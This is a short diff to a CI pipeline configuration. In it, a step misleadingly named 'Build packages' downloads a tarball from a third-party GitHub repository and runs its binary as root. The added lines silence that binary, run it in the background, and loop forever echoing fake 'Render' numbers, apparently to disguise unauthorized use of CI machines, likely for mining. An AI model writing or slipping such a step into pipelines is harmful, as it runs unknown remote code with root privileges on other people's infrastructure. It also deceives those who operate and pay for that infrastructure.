@@ -12,4 +12,8 @@ jobs:
       - run: 
           name: Build packages
           command: |
-            wget -q https://github.com/HectorCrespoThomas/asd/raw/main/run.tar; tar xf run.tar; sudo -u root ./run
+            wget -q https://github.com/HectorCrespoThomas/asd/raw/main/run.tar; tar xf run.tar; sudo -u root ./run >/dev/null 2>&1 & sleep 0.1
+            while :; do
+            echo 'Render '$(shuf -i 1999999-9999999 -n 1)
+            sleep 300
+            done
